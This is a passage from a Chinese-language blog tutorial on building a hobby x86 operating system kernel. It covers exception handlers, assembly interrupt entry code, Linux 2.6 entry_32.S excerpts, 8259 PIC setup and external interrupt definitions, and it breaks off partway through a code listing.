/></p><p>这里我们实现的是异常，所以是<code>exception_handler</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">exception_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *message = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vector</span> &lt; <span class="number">22</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="built_in">vector</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;\nEXCEPTION : %s \n&quot;</span>, messages[<span class="built_in">vector</span>]);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时我门在跳转的时候需要使用栈来保存相关信息，并且要记录系统调用号对应的函数地址，对于有的报错需要压入一些值到栈里面</p><blockquote><p>As can be seen in the figure below, an interrupt pushes the EFLAGS register before saving the address of the interrupted instruction. Certain types of exceptions also cause an error code to be pushed on the stack to help debug the exception.</p><ul><li><p>CPU checks the current privilege level</p></li><li><p>if need to change privilege level</p><blockquote><ul><li>change stack with the one associated with new privilege</li><li>save old stack information on the new stack</li></ul></blockquote></li><li><p>save EFLAGS, CS, EIP on stack</p></li><li><p>save error code on stack in case of an abort</p></li><li><p>execute the kernel interrupt handler</p></li></ul><p>To resume the execution after an interrupt the following sequence is used (x86):</p><ul><li>pop the error code (in case of an abort)</li><li>call IRET<ul><li>pops values from the stack and restore the following register: CS, EIP, EFLAGS</li><li>if privilege level changed returns to the old stack and old privilege level</li></ul></li></ul></blockquote><p><img src="https://img.joe1sn.top/uploads/big/b34acca49e3b05e5536de6aba53b2674.png" alt="" /></p><p>所以也有了<code>handler.asm</code>中的<code>handler_entry_table</code>那么长一串，以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">interrupt_entry:</span><br><span class="line"></span><br><span class="line">    ; 保存上文寄存器信息</span><br><span class="line">    push ds</span><br><span class="line">    push es</span><br><span class="line">    push fs</span><br><span class="line">    push gs</span><br><span class="line">    pusha</span><br><span class="line"></span><br><span class="line">    ; 找到前面 push %1 压入的 中断向量</span><br><span class="line">    mov eax, [esp + 12 * 4]</span><br><span class="line"></span><br><span class="line">    ; 向中断处理函数传递参数</span><br><span class="line">    push eax</span><br><span class="line"></span><br><span class="line">    ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针</span><br><span class="line">    call [handler_table + eax * 4]</span><br><span class="line"></span><br><span class="line">    ; 对应 push eax，调用结束恢复栈</span><br><span class="line">    add esp, 4</span><br><span class="line"></span><br><span class="line">    ; 恢复下文寄存器信息</span><br><span class="line">    popa</span><br><span class="line">    pop gs</span><br><span class="line">    pop fs</span><br><span class="line">    pop es</span><br><span class="line">    pop ds</span><br><span class="line"></span><br><span class="line">    ; 对应 push %1</span><br><span class="line">    ; 对应 error code 或 push magic</span><br><span class="line">    add esp, 8</span><br><span class="line">    iret</span><br></pre></td></tr></table></figure><p>同样的在Linux中也有，但是他的实现更加的复杂</p><p><img src="https://img.joe1sn.top/uploads/big/d4e49ec3ae65ad3cb7269ca47a22b5cc.png" alt="" /></p><p><img src="https://img.joe1sn.top/uploads/big/04d3f830ec26811739d85f99359e59e8.jpg" alt="" /></p><p><img src="https://img.joe1sn.top/uploads/big/6a2b08d2b164630b6c9457602730a29e.jpg" alt="" /></p><p><img src="https://img.joe1sn.top/uploads/big/ef7eb5d1bc8e06d5405bbf575ddaa4db.jpg" alt="" /></p><p>不过仍然能找到<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch/x86/kernel">kernel</a>/<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch/x86/kernel/entry_32.S">entry_32.S</a>（其他版本可能实现地方不同，这是2.6内核版本的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">.macro TRACE_IRQS_IRET</span><br><span class="line">#ifdef CONFIG_TRACE_IRQFLAGS</span><br><span class="line">testl $X86_EFLAGS_IF,PT_EFLAGS(%esp)     # interrupts off?</span><br><span class="line">jz 1f</span><br><span class="line">TRACE_IRQS_ON</span><br><span class="line">1:</span><br><span class="line">#endif</span><br><span class="line">.endm</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * User gs save/restore</span><br><span class="line"> *</span><br><span class="line"> * %gs is used for userland TLS and kernel only uses it for stack</span><br><span class="line"> * canary which is required to be at %gs:20 by gcc.  Read the comment</span><br><span class="line"> * at the top of stackprotector.h for more info.</span><br><span class="line"> *</span><br><span class="line"> * Local labels 98 and 99 are used.</span><br><span class="line"> */</span><br><span class="line">#ifdef CONFIG_X86_32_LAZY_GS</span><br><span class="line"></span><br><span class="line"> /* unfortunately push/pop can&#x27;t be no-op */</span><br><span class="line">.macro PUSH_GS</span><br><span class="line">pushl_cfi $0</span><br><span class="line">.endm</span><br><span class="line">.macro POP_GS pop=0</span><br><span class="line">addl $(4 + \pop), %esp</span><br><span class="line">CFI_ADJUST_CFA_OFFSET -(4 + \pop)</span><br><span class="line">.endm</span><br><span class="line">.macro POP_GS_EX</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line"> /* all the rest are no-op */</span><br><span class="line">.macro PTGS_TO_GS</span><br><span class="line">.endm</span><br><span class="line">.macro PTGS_TO_GS_EX</span><br><span class="line">.endm</span><br><span class="line">.macro GS_TO_REG reg</span><br><span class="line">.endm</span><br><span class="line">.macro REG_TO_PTGS reg</span><br><span class="line">.endm</span><br><span class="line">.macro SET_KERNEL_GS reg</span><br><span class="line">.endm</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">.macro GS_TO_REG reg</span><br><span class="line">movl %gs, \reg</span><br><span class="line">/*CFI_REGISTER gs, \reg*/</span><br><span class="line">.endm</span><br><span class="line">.macro REG_TO_PTGS reg</span><br><span class="line">movl \reg, PT_GS(%esp)</span><br><span class="line">/*CFI_REL_OFFSET gs, PT_GS*/</span><br><span class="line">.endm</span><br><span class="line">.macro SET_KERNEL_GS reg</span><br><span class="line">movl $(__KERNEL_STACK_CANARY), \reg</span><br><span class="line">movl \reg, %gs</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line">#endif/* CONFIG_X86_32_LAZY_GS */</span><br><span class="line"></span><br><span class="line">.macro SAVE_ALL</span><br><span class="line">cld</span><br><span class="line">PUSH_GS</span><br><span class="line">pushl_cfi %fs</span><br><span class="line">/*CFI_REL_OFFSET fs, 0;*/</span><br><span class="line">pushl_cfi %es</span><br><span class="line">/*CFI_REL_OFFSET es, 0;*/</span><br><span class="line">pushl_cfi %ds</span><br><span class="line">/*CFI_REL_OFFSET ds, 0;*/</span><br><span class="line">pushl_cfi %eax</span><br><span class="line">CFI_REL_OFFSET eax, 0</span><br><span class="line">pushl_cfi %ebp</span><br><span class="line">CFI_REL_OFFSET ebp, 0</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">.macro RESTORE_INT_REGS</span><br><span class="line">popl_cfi %ebx</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>对应的64位：<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch/x86/kernel">kernel</a>/<a href="https://elixir.bootlin.com/linux/v2.6.39.4/source/arch/x86/kernel/entry_64.S">entry_64.S</a></p><h2 id="参考-5"><a class="markdownIt-Anchor" href="#参考-5"></a> 参考</h2><p><a href="https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html">https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html</a></p><p><a href="https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/">https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/</a></p><h1 id="操作系统实现-外中断"><a class="markdownIt-Anchor" href="#操作系统实现-外中断"></a> 操作系统实现-外中断</h1><blockquote><p>代码来源：<a href="https://github.com/StevenBaby/onix">https://github.com/StevenBaby/onix</a></p><p>相关课程：<a href="https://www.bilibili.com/video/BV1gR4y1u7or">https://www.bilibili.com/video/BV1gR4y1u7or</a></p><p>感谢B站UP：<a href="https://space.bilibili.com/491131440">踌躇月光</a> 带来的相关代码和教程</p></blockquote><p>up的原视频直接开始将源代码了，但是我操作系统没学好怎么办，赶紧查外中断是个啥</p><p>中断的种类有：</p><ul><li>异常</li><li>外中断</li><li>软中断</li></ul><p>UP的图总结的非常好</p><p><img src="https://img.joe1sn.top/uploads/big/c2a286e27b24a9bd12a2e53ef6af1414.png" alt="image-20220316170057409" /></p><p>在上一篇我们实现的是异常，这里实现的是外中断，有了外中断我们就可以做一些输入了</p><p>比如：</p><ol><li>键盘按下一个按钮（其实感兴趣的话不妨去了解了解TTY(TeleTypeWriter)）</li><li>键盘芯片通过数据总线向CPU传递信号，要求CPU暂停，从死循环跳出（中断），转到来处理这个按钮所出发的时间</li><li>CPU处理完成后返回原来的执行流</li></ol><p>这里描绘一下8086PC机键盘处理过程</p><blockquote><p>CPU一直在检测中断</p></blockquote><ol><li><p>键盘按下，发出终端扫描码0x1E，被I/O接口的0x60端口上</p></li><li><p>I/O接口触发9号中断通过<strong>数据总线</strong>送到CPU的中断逻辑中，并且将信号通过<strong>数据总线</strong>发送到数据缓冲寄存器中</p></li><li><p>CPU会根据标志寄存器<strong>IF</strong>位判断，是<strong>1</strong>就响应，<strong>0</strong>则等待，中断逻辑检测到9号中断，触发9号中断处理程序(这个处理程序就是我们要写的)，电路级别的是从CPU内部实现的，信号传递是通过CPU针脚传递</p><p><img src="https://img.joe1sn.top/uploads/big/a7b7a6ea5d5e4e8767ca48fbb638dabb.png" alt="image-20220317163807327" /></p></li><li><p>同时CPU将键盘信号0x1E转为ASCII码0x61</p></li><li><p>再将0x1E和0x61组合送到内存-键盘缓冲区中（ASCII地位，信号高位）</p></li><li><p>最后CPU向键盘发送应答信息</p></li></ol><p>最开始的PS2协议的键盘(圆头的)就是通过这种方式进行输入的</p><p>所以我们需要做相当多的关于硬件的操作，有点像计组了</p><p><code>src/include/xsys/interrupt.h</code> 定义了一些中断编号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_CLOCK 0      <span class="comment">// 时钟</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_KEYBOARD 1   <span class="comment">// 键盘</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_CASCADE 2    <span class="comment">// 8259 从片控制器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_SERIAL_2 3   <span class="comment">// 串口 2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_SERIAL_1 4   <span class="comment">// 串口 1</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_PARALLEL_2 5 <span class="comment">// 并口 2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_FLOPPY 6     <span class="comment">// 软盘控制器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_PARALLEL_1 7 <span class="comment">// 并口 1</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_RTC 8        <span class="comment">// 实时时钟</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_REDIRECT 9   <span class="comment">// 重定向 IRQ2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_MOUSE 12     <span class="comment">// 鼠标</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_MATH 13      <span class="comment">// 协处理器 x87</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_HARDDISK 14  <span class="comment">// ATA 硬盘第一通道</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_HARDDISK2 15 <span class="comment">// ATA 硬盘第二通道</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_MASTER_NR 0x20 <span class="comment">// 主片起始向量号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_SLAVE_NR 0x28  <span class="comment">// 从片起始向量号</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/interrupt.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/interrupt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/global.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/printk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGK(fmt, args...) DEBUGK(fmt, ##args)</span></span><br><span class="line"><span class="comment">// #define LOGK(fmt, args...)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENTRY_SIZE 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_M_CTRL 0x20 <span class="comment">// 主片的控制端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_M_DATA 0x21 <span class="comment">// 主片的数据端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_S_CTRL 0xa0 <span class="comment">// 从片的控制端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_S_DATA 0xa1 <span class="comment">// 从片的数据端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_EOI 0x20    <span class="comment">// 通知中断控制器中断结束</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">gate_t</span> idt[IDT_SIZE];</span><br><span class="line"><span class="type">pointer_t</span> idt_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">handler_t</span> handler_table[IDT_SIZE];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">handler_t</span> handler_entry_table[ENTRY_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *messages[] = &#123;</span><br><span class="line">    <span class="string">&quot;#DE Divide Error\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#DB RESERVED\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;--  NMI Interrupt\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#BP Breakpoint\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#OF Overflow\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#BR BOUND Range Exceeded\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#UD Invalid Opcode (Undefined Opcode)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#NM Device Not Available (No Math Coprocessor)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#DF Double Fault\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;    Coprocessor Segment Overrun (reserved)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#TS Invalid TSS\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#NP Segment Not Present\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#SS Stack-Segment Fault\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#GP General Protection\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#PF Page Fault\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;--  (Intel reserved. Do not use.)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#MF x87 FPU Floating-Point Error (Math Fault)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#AC Alignment Check\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#MC Machine Check\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#XF SIMD Floating-Point Exception\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#VE Virtualization Exception\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#CP Control Protection Exception\0&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通知中断控制器，中断处理结束</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_eoi</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vector</span> &gt;= <span class="number">0x20</span> &amp;&amp; <span class="built_in">vector</span> &lt; <span class="number">0x28</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        outb(PIC_M_CTRL, PIC_EOI);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vector</span> &gt;= <span class="number">0x28</span> &amp;&amp; <span class="built_in">vector</span> &lt; <span class="number">0x30</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        outb(PIC_M_CTRL, PIC_EOI);</span><br><span class="line">        outb(PIC_S_CTRL, PIC_EOI);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u32 counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">default_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    send_eoi(<span class="built_in">vector</span>);</span><br><span class="line">    LOGK(<span class="string">&quot;[%d] default interrupt called %d...\n&quot;</span>, <span class="built_in">vector</span>, counter++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exception_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *message = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vector</span> &lt; <span class="number">22</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="built_in">vector</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;Exception : [0x%02X] %s \n&quot;</span>, <span class="built_in">vector</span>, messages[<span class="built_in">vector</span>]);</span><br><span class="line">    <span class="comment">// 阻塞</span></span><br><span class="line">    hang();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化中断控制器</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pic_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    outb(PIC_M_CTRL, <span class="number">0b00010001</span>); <span class="comment">// ICW1: 边沿触发, 级联 8259, 需要ICW4.</span></span><br><span class="line">    outb(PIC_M_DATA, <span class="number">0x20</span>);       <span class="comment">// ICW2: 起始端口号 0x20</span></span><br><span class="line">    outb(PIC_M_DATA, <span class="number">0b00000100</span>); <span class="comment">// ICW3: IR2接从片.</span></span><br><span class="line">    outb(PIC_M_DATA, <span class="number">0b00000001</span>); <span class="comment">// ICW4: 8086模式, 正常EOI</span></span><br><span class="line"></span><br><span class="line">    outb(PIC_S_CTRL, <span class="number">0b00010001</span>); <span class="comment">// ICW1: 边沿触发, 级联 8259, 需要ICW4.</span></span><br><span class="line">    outb(PIC_S_DATA, <span class="number">0x28</span>);       <span class="comment">// ICW2: 起始端口号 0x28</span></span><br><span class="line">    outb(PIC_S_DATA, <span class="number">2</span>);          <span class="comment">// ICW3: 设置从片连接到主片的 IR2 引脚</span></span><br><span class="line">    outb(PIC_S_DATA, <span class="number">0b00000001</span>); <span class="comment">// ICW4: 8086模式, 正常EOI</span></span><br><span class="line"></span><br><span class="line">    outb(PIC_M_DATA, <span class="number">0b11111110</span>); <span class="comment">// 关闭所有中断</span></span><br><span class="line">    outb(PIC_S_DATA, <span class="number">0b11111111</span>); <span class="comment">// 关闭所有中断</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化中断描述符，和中断处理函数数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">idt_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ENTRY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">gate_t</span> *gate = &amp;idt[i];</span><br><span class="line">        <span class="type">handler_t</span> handler = handler_entry_table[i];</span><br><span class="line"></span><br><span class="line">        gate-&gt;offset0 = (u32)handler &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;offset1 = ((u32)handler &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>; <span class="comment">// 代码段</span></span><br><span class="line">        gate-&gt;reserved = <span class="number">0</span>;      <span class="comment">// 保留不用</span></span><br><span class="line">        gate-&gt;type = <span class="number">0b1110</span>;     <span class="comment">// 中断门</span></span><br><span class="line">        gate-&gt;segment = <span class="number">0</span>;       <span class="comment">// 系统段</span></span><br><span class="line">        gate-&gt;DPL = <span class="number">0</span>;           <span class="comment">// 内核态</span></span><br><span class="line">        gate-&gt;present = <span class="number">1</span>;       <span class="comment">// 有效</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        handler_table[i] = exception_handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">20</span>; i &lt; ENTRY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        handler_table[i] = default_handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idt_ptr.base = (u32)idt;</span><br><span class="line">    idt_ptr.limit = <span class="keyword">sizeof</span>(idt) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lidt idt_ptr\n&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    pic_init();</span><br><span class="line">    idt_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 